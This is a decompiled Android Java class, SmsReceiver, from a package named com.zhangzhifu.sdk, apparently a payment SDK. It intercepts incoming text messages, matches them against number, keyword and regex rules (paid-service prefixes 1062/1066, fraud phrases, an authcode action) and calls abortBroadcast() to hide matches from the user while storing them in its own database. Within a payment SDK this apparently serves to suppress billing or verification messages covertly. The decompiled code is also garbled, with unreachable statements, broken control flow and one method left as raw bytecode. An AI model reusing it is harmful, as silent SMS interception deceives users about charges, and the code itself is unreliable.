package com.zhangzhifu.sdk.util.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.PowerManager.WakeLock;
import android.telephony.SmsMessage;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.util.sms.database.DbAdapter;
import com.zhangzhifu.sdk.util.sms.database.ReadRules;
import com.zhangzhifu.sdk.util.sms.util.MessageUtils;
import java.io.PrintStream;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsReceiver
  extends BroadcastReceiver
{
  static final Object dj = new Object();
  static PowerManager.WakeLock dk = null;
  private static SmsReceiver dl = null;
  private static String dn;
  private static String jdField_do;
  private static long dp;
  private static long dq;
  private static boolean ds = true;
  private static boolean dt = false;
  private static boolean du = true;
  private static boolean dv = true;
  private String MCC;
  private DbAdapter bc = null;
  private StringBuilder de = new StringBuilder();
  private String df = null;
  private long dg;
  private String dh;
  private String di;
  private final String dm = "system.sms.authcode";
  private HashMap dr = new HashMap();
  private String smsBody;
  
  public SmsReceiver() {}
  
  private boolean a(Context paramContext, boolean paramBoolean)
  {
    String[] arrayOfString2 = ReadRules.getRulesNumbers(this.bc, "type= 1", this.MCC);
    String[] arrayOfString1 = arrayOfString2;
    if (paramBoolean)
    {
      arrayOfString1 = arrayOfString2;
      if (du) {
        arrayOfString1 = concat(arrayOfString2, ReadRules.getRulesNumbers(this.bc, "type= 7", this.MCC));
      }
    }
    int j = arrayOfString1.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (arrayOfString1[i].contains("?")) {
          arrayOfString1[i] = arrayOfString1[i].replaceAll("\\?", ".");
        }
        while (Pattern.matches(arrayOfString1[i], this.dh))
        {
          f(paramContext, "[白号码] " + arrayOfString1[i]);
          return true;
          if (arrayOfString1[i].contains("*")) {
            arrayOfString1[i] = arrayOfString1[i].replaceAll("\\*", ".*");
          }
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        i(paramContext, "005");
        return false;
      }
    }
  }
  
  private static boolean a(String paramString1, String paramString2)
  {
    paramString1 = Pattern.compile(paramString1).matcher(paramString2);
    if (paramString1.find()) {
      return true;
    }
    paramString1.reset();
    return false;
  }
  
  public static String[] concat(String[] paramArrayOfString1, String[] paramArrayOfString2)
  {
    if (paramArrayOfString1.length == 0) {
      return paramArrayOfString2;
    }
    if (paramArrayOfString2.length == 0) {
      return paramArrayOfString1;
    }
    String[] arrayOfString = new String[paramArrayOfString1.length + paramArrayOfString2.length];
    System.arraycopy(paramArrayOfString1, 0, arrayOfString, 0, paramArrayOfString1.length);
    System.arraycopy(paramArrayOfString2, 0, arrayOfString, paramArrayOfString1.length, paramArrayOfString2.length);
    return arrayOfString;
  }
  
  /* Error */
  private void e(Context paramContext, String paramString)
  {
    // Byte code:
    //   0: aload_0
    //   1: invokevirtual 183	com/zhangzhifu/sdk/util/sms/SmsReceiver:abortBroadcast	()V
    //   4: aload_0
    //   5: getfield 66	com/zhangzhifu/sdk/util/sms/SmsReceiver:bc	Lcom/zhangzhifu/sdk/util/sms/database/DbAdapter;
    //   8: aload_0
    //   9: getfield 64	com/zhangzhifu/sdk/util/sms/SmsReceiver:df	Ljava/lang/String;
    //   12: aload_0
    //   13: getfield 62	com/zhangzhifu/sdk/util/sms/SmsReceiver:de	Ljava/lang/StringBuilder;
    //   16: invokevirtual 132	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   19: aload_0
    //   20: getfield 185	com/zhangzhifu/sdk/util/sms/SmsReceiver:dg	J
    //   23: aload_2
    //   24: invokevirtual 191	com/zhangzhifu/sdk/util/sms/database/DbAdapter:createOne	(Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;)J
    //   27: lstore_3
    //   28: aload_1
    //   29: aload_1
    //   30: invokestatic 197	com/zhangzhifu/sdk/util/sms/util/MessageUtils:readUnreadCountSharedPreferences	(Landroid/content/Context;)I
    //   33: iconst_1
    //   34: iadd
    //   35: invokestatic 201	com/zhangzhifu/sdk/util/sms/util/MessageUtils:writeUnreadCountSharedPreferences	(Landroid/content/Context;I)V
    //   38: aload_1
    //   39: ldc -53
    //   41: lload_3
    //   42: invokestatic 209	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   45: invokevirtual 210	java/lang/Long:toString	()Ljava/lang/String;
    //   48: invokestatic 214	com/zhangzhifu/sdk/util/sms/util/MessageUtils:writeStringSharedPreferences	(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    //   51: aload_0
    //   52: new 187	com/zhangzhifu/sdk/util/sms/database/DbAdapter
    //   55: dup
    //   56: aload_1
    //   57: invokespecial 217	com/zhangzhifu/sdk/util/sms/database/DbAdapter:<init>	(Landroid/content/Context;)V
    //   60: putfield 66	com/zhangzhifu/sdk/util/sms/SmsReceiver:bc	Lcom/zhangzhifu/sdk/util/sms/database/DbAdapter;
    //   63: aload_0
    //   64: getfield 66	com/zhangzhifu/sdk/util/sms/SmsReceiver:bc	Lcom/zhangzhifu/sdk/util/sms/database/DbAdapter;
    //   67: ifnull +133 -> 200
    //   70: aload_0
    //   71: aload_0
    //   72: getfield 66	com/zhangzhifu/sdk/util/sms/SmsReceiver:bc	Lcom/zhangzhifu/sdk/util/sms/database/DbAdapter;
    //   75: aload_1
    //   76: invokevirtual 221	com/zhangzhifu/sdk/util/sms/database/DbAdapter:Query	(Landroid/content/Context;)Ljava/util/HashMap;
    //   79: putfield 75	com/zhangzhifu/sdk/util/sms/SmsReceiver:dr	Ljava/util/HashMap;
    //   82: aload_0
    //   83: getfield 75	com/zhangzhifu/sdk/util/sms/SmsReceiver:dr	Ljava/util/HashMap;
    //   86: ldc -33
    //   88: invokevirtual 227	java/util/HashMap:get	(Ljava/lang/Object;)Ljava/lang/Object;
    //   91: checkcast 99	java/lang/String
    //   94: putstatic 229	com/zhangzhifu/sdk/util/sms/SmsReceiver:do	Ljava/lang/String;
    //   97: getstatic 231	com/zhangzhifu/sdk/util/sms/SmsReceiver:dq	J
    //   100: lconst_0
    //   101: lcmp
    //   102: ifeq +140 -> 242
    //   105: getstatic 233	com/zhangzhifu/sdk/util/sms/SmsReceiver:dp	J
    //   108: lconst_0
    //   109: lcmp
    //   110: ifeq +132 -> 242
    //   113: invokestatic 237	com/zhangzhifu/sdk/util/sms/SmsReceiver:j	()I
    //   116: iconst_1
    //   117: if_icmpne +95 -> 212
    //   120: aload_0
    //   121: getstatic 229	com/zhangzhifu/sdk/util/sms/SmsReceiver:do	Ljava/lang/String;
    //   124: putfield 239	com/zhangzhifu/sdk/util/sms/SmsReceiver:smsBody	Ljava/lang/String;
    //   127: aload_0
    //   128: getfield 239	com/zhangzhifu/sdk/util/sms/SmsReceiver:smsBody	Ljava/lang/String;
    //   131: astore_2
    //   132: invokestatic 245	com/zhangzhifu/sdk/db/SharePreferUtil:getInstance	()Lcom/zhangzhifu/sdk/db/SharePreferUtil;
    //   135: pop
    //   136: aload_2
    //   137: aload_1
    //   138: invokestatic 249	com/zhangzhifu/sdk/db/SharePreferUtil:getSmsBodyKey	(Landroid/content/Context;)Ljava/lang/String;
    //   141: invokevirtual 103	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   144: ifeq +15 -> 159
    //   147: invokestatic 245	com/zhangzhifu/sdk/db/SharePreferUtil:getInstance	()Lcom/zhangzhifu/sdk/db/SharePreferUtil;
    //   150: pop
    //   151: aload_1
    //   152: aload_0
    //   153: getfield 239	com/zhangzhifu/sdk/util/sms/SmsReceiver:smsBody	Ljava/lang/String;
    //   156: invokestatic 252	com/zhangzhifu/sdk/db/SharePreferUtil:setSmsBody	(Landroid/content/Context;Ljava/lang/String;)V
    //   159: aload_0
    //   160: getfield 62	com/zhangzhifu/sdk/util/sms/SmsReceiver:de	Ljava/lang/StringBuilder;
    //   163: iconst_0
    //   164: aload_0
    //   165: getfield 62	com/zhangzhifu/sdk/util/sms/SmsReceiver:de	Ljava/lang/StringBuilder;
    //   168: invokevirtual 255	java/lang/StringBuilder:length	()I
    //   171: invokevirtual 259	java/lang/StringBuilder:delete	(II)Ljava/lang/StringBuilder;
    //   174: pop
    //   175: aload_1
    //   176: ldc_w 261
    //   179: invokestatic 264	com/zhangzhifu/sdk/util/sms/SmsReceiver:h	(Landroid/content/Context;Ljava/lang/String;)V
    //   182: return
    //   183: astore_2
    //   184: aload_2
    //   185: invokevirtual 265	java/lang/NumberFormatException:printStackTrace	()V
    //   188: getstatic 269	java/lang/System:out	Ljava/io/PrintStream;
    //   191: ldc_w 271
    //   194: invokevirtual 276	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   197: goto -100 -> 97
    //   200: getstatic 269	java/lang/System:out	Ljava/io/PrintStream;
    //   203: ldc_w 278
    //   206: invokevirtual 276	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   209: goto -112 -> 97
    //   212: invokestatic 237	com/zhangzhifu/sdk/util/sms/SmsReceiver:j	()I
    //   215: iconst_2
    //   216: if_icmpne -89 -> 127
    //   219: getstatic 269	java/lang/System:out	Ljava/io/PrintStream;
    //   222: ldc_w 280
    //   225: invokevirtual 276	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   228: aload_0
    //   229: aload_0
    //   230: getfield 62	com/zhangzhifu/sdk/util/sms/SmsReceiver:de	Ljava/lang/StringBuilder;
    //   233: invokevirtual 132	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   236: putfield 239	com/zhangzhifu/sdk/util/sms/SmsReceiver:smsBody	Ljava/lang/String;
    //   239: goto -112 -> 127
    //   242: getstatic 231	com/zhangzhifu/sdk/util/sms/SmsReceiver:dq	J
    //   245: lconst_0
    //   246: lcmp
    //   247: ifeq +21 -> 268
    //   250: getstatic 233	com/zhangzhifu/sdk/util/sms/SmsReceiver:dp	J
    //   253: lconst_0
    //   254: lcmp
    //   255: ifne +13 -> 268
    //   258: aload_0
    //   259: getstatic 229	com/zhangzhifu/sdk/util/sms/SmsReceiver:do	Ljava/lang/String;
    //   262: putfield 239	com/zhangzhifu/sdk/util/sms/SmsReceiver:smsBody	Ljava/lang/String;
    //   265: goto -138 -> 127
    //   268: aload_0
    //   269: aload_0
    //   270: getfield 62	com/zhangzhifu/sdk/util/sms/SmsReceiver:de	Ljava/lang/StringBuilder;
    //   273: invokevirtual 132	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   276: putfield 239	com/zhangzhifu/sdk/util/sms/SmsReceiver:smsBody	Ljava/lang/String;
    //   279: goto -152 -> 127
    //   282: astore_2
    //   283: aload_2
    //   284: invokevirtual 281	java/lang/Exception:printStackTrace	()V
    //   287: goto -128 -> 159
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	290	0	this	SmsReceiver
    //   0	290	1	paramContext	Context
    //   0	290	2	paramString	String
    //   27	15	3	l	long
    // Exception table:
    //   from	to	target	type
    //   70	97	183	java/lang/NumberFormatException
    //   127	159	282	java/lang/Exception
  }
  
  private void f(Context paramContext, String paramString)
  {
    this.bc.createAllowOne(this.df, this.dg, paramString);
    this.bc = null;
    this.de.delete(0, this.de.length());
    h(paramContext, "000");
  }
  
  private boolean f(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.bc, "type= 4");
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (arrayOfString[i].contains("*")) {
          arrayOfString[i] = arrayOfString[i].replaceAll("\\*", ".*");
        }
        if (a(arrayOfString[i], this.di))
        {
          f(paramContext, "[自定白关键词] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        i(paramContext, "006");
      }
    }
    return false;
  }
  
  private boolean g(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesNumbers(this.bc, "type= 0", this.MCC);
    int j = arrayOfString.length;
    StringBuilder localStringBuilder = new StringBuilder();
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        localStringBuilder.append(arrayOfString[i].replaceAll("\\?", ".").replaceAll("\\*", ".*"));
        if (Pattern.matches(localStringBuilder.toString(), this.dh))
        {
          e(paramContext, "[自定黑号码]" + arrayOfString[i]);
          return true;
        }
        localStringBuilder.delete(0, localStringBuilder.length());
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        i(paramContext, "008");
      }
    }
    return false;
  }
  
  private boolean g(Context paramContext, String paramString)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.bc, "type=5");
    int j = arrayOfString.length;
    paramString = Integer.toString(paramString.length());
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (paramString.equals(arrayOfString[i]))
        {
          e(paramContext, "[自定匹配位数] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException paramString)
      {
        paramString.printStackTrace();
        i(paramContext, "007");
      }
    }
    return false;
  }
  
  public static SmsReceiver getInstance()
  {
    if (dl == null) {
      dl = new SmsReceiver();
    }
    return dl;
  }
  
  private static void h(Context paramContext, String paramString)
  {
    MessageUtils.writeStringSharedPreferences(paramContext, "ErrorCode", paramString);
  }
  
  private boolean h(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.bc, "type=8");
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (a(arrayOfString[i], this.di))
        {
          e(paramContext, "[自定黑词] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        i(paramContext, "009");
      }
    }
    return false;
  }
  
  private static void i(Context paramContext, String paramString)
  {
    MessageUtils.writeStringSharedPreferences(paramContext, "ErrorCode", paramString);
  }
  
  private boolean i(Context paramContext)
  {
    String[] arrayOfString = ReadRules.getRulesStrings(this.bc, "type='6'");
    int j = arrayOfString.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (Pattern.matches(arrayOfString[i], this.di))
        {
          e(paramContext, "[正则式] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        i(paramContext, "010");
      }
    }
    return false;
  }
  
  private static int j()
  {
    if (dq > dp) {
      return 1;
    }
    return 2;
  }
  
  private boolean j(Context paramContext)
  {
    String[] arrayOfString;
    int j;
    int i;
    if (du)
    {
      arrayOfString = ReadRules.getRulesNumbers(this.bc, "type= 7", this.MCC);
      j = arrayOfString.length;
      i = 0;
    }
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (arrayOfString[i].contains("?")) {
          arrayOfString[i] = arrayOfString[i].replaceAll("\\?", ".");
        }
        while (Pattern.matches(arrayOfString[i], this.dh))
        {
          f(paramContext, "[内置白号码] " + arrayOfString[i]);
          return true;
          if (arrayOfString[i].contains("*")) {
            arrayOfString[i] = arrayOfString[i].replaceAll("\\*", ".*");
          }
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        i(paramContext, "011");
        return false;
      }
    }
  }
  
  private boolean k(Context paramContext)
  {
    String[] arrayOfString;
    int j;
    int i;
    if (dv)
    {
      arrayOfString = ReadRules.getRulesStrings(this.bc, "type='3'");
      j = arrayOfString.length;
      i = 0;
    }
    for (;;)
    {
      if (i >= j) {
        return false;
      }
      try
      {
        if (a(arrayOfString[i], this.di))
        {
          e(paramContext, "[内置黑词] " + arrayOfString[i]);
          return true;
        }
        i += 1;
      }
      catch (RuntimeException localRuntimeException)
      {
        localRuntimeException.printStackTrace();
        i(paramContext, "012");
      }
    }
    return false;
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    try
    {
      if (!paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
        break label85;
      }
      arrayOfObject = (Object[])paramIntent.getExtras().get("pdus");
      arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
      if (arrayOfSmsMessage.equals("")) {
        break label85;
      }
      i = 0;
    }
    catch (Exception localException)
    {
      try
      {
        for (;;)
        {
          SmsMessage[] arrayOfSmsMessage;
          label85:
          dn = paramIntent.getStringExtra("sysSMS_Body");
          dp = paramIntent.getLongExtra("sysSMS_Time", 1111L);
          h(paramContext, "103");
          this.bc = null;
          this.bc = new DbAdapter(paramContext);
          this.MCC = MessageUtils.fetchMCC(paramContext);
          this.dh = this.df;
          if (this.dh.startsWith(this.MCC)) {
            this.dh = this.dh.substring(this.MCC.length());
          }
          h(paramContext, "105");
          this.di = this.de.toString().replaceAll("\\s", "").toLowerCase();
          if ((!ds) && (dt)) {
            break label471;
          }
          System.out.println("onlycontactwhite" + ds);
          System.out.println("period" + dt);
          h(paramContext, "106");
          if (!ds) {
            break label471;
          }
          if (!a(paramContext, true)) {
            break;
          }
          return;
          arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
          i += 1;
          continue;
          Object[] arrayOfObject = arrayOfSmsMessage[i];
          this.de.append(arrayOfObject.getMessageBody());
          this.df = arrayOfObject.getOriginatingAddress();
          this.dg = arrayOfObject.getTimestampMillis();
          if (((SharePreferUtil.getSeCendAddress(paramContext) != null) || (!SharePreferUtil.getSeCendAddress(paramContext).equals(""))) && (this.df.contains(SharePreferUtil.getSeCendAddress(paramContext))) && (!this.df.equals("10086"))) {
            SharePreferUtil.setSeCendRedamAddress(paramContext, this.df);
          }
          i += 1;
        }
        localException = localException;
        localException.printStackTrace();
      }
      catch (Exception paramIntent)
      {
        do
        {
          for (;;)
          {
            paramIntent.printStackTrace();
            System.out.println("系统信箱中未查到该信息");
          }
        } while (f(paramContext));
        e(paramContext, "[仅放行联系人和白名单]");
        return;
      }
    }
    if (i >= arrayOfObject.length)
    {
      this.de.delete(0, this.de.length());
      j = arrayOfSmsMessage.length;
      i = 0;
      if ((i >= j) && (!paramIntent.getAction().equals("system.sms.authcode"))) {}
    }
    label471:
    do
    {
      do
      {
        do
        {
          do
          {
            do
            {
              do
              {
                h(paramContext, "109");
              } while (a(paramContext, false));
              h(paramContext, "110");
            } while (f(paramContext));
            h(paramContext, "111");
          } while (g(paramContext, this.dh));
          h(paramContext, "112");
        } while (g(paramContext));
        h(paramContext, "113");
      } while (h(paramContext));
      h(paramContext, "114");
    } while ((i(paramContext)) || (j(paramContext)));
    if ((Pattern.matches("1062.*", this.dh)) || (Pattern.matches("1066.*", this.dh)))
    {
      e(paramContext, "[收费业务]");
      return;
    }
    paramIntent = new String[19];
    paramIntent[0] = ".*账号.*";
    paramIntent[1] = ".*账户.*";
    paramIntent[2] = ".*汇[^\\p{P}]*钱.*";
    paramIntent[3] = ".*钱[^\\p{P}]*汇.*";
    paramIntent[4] = ".*打[^\\p{P}]*钱.*";
    paramIntent[5] = ".*钱[^\\p{P}]*打.*";
    paramIntent[6] = ".*汇[^\\p{P}]*款.*";
    paramIntent[7] = ".*款[^\\p{P}]*汇.*";
    paramIntent[8] = ".*打[^\\p{P}]*款.*";
    paramIntent[9] = ".*款[^\\p{P}]*打.*";
    paramIntent[10] = ".*存[^\\p{P}]*款.*";
    paramIntent[11] = ".*款[^\\p{P}]*存.*";
    paramIntent[12] = ".*邮政.*包裹.*";
    paramIntent[13] = ".*包裹.*邮政.*";
    paramIntent[14] = ".*机.*幸运.*码.*";
    paramIntent[15] = ".*机号.*幸运.*";
    paramIntent[16] = ".*通知.*违章.*联系.*";
    paramIntent[17] = ".*银行[】\\]\\.\\。]*\\w{0,3}";
    paramIntent[18] = ".*[【\\[].?行[】\\]]*\\w{0,3}";
    int j = paramIntent.length;
    int i = 0;
    for (;;)
    {
      if (i >= j) {}
      while (!k(paramContext))
      {
        f(paramContext, "[没有规则]");
        return;
        try
        {
          if ((!Pattern.matches(paramIntent[i], this.di)) || (this.dh.length() != 11)) {
            break label820;
          }
          e(paramContext, "[可疑诈骗]");
          return;
        }
        catch (RuntimeException paramIntent)
        {
          paramIntent.printStackTrace();
          i(paramContext, "003");
        }
      }
      break;
      label820:
      i += 1;
    }
  }
  
  protected void onReceiveWithPrivilege(Context paramContext, Intent paramIntent, boolean paramBoolean)
  {
    if ((!paramBoolean) && (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))) {
      return;
    }
    paramIntent.setClass(paramContext, SmsReceiverService.class);
    paramIntent.putExtra("result", getResultCode());
  }
}
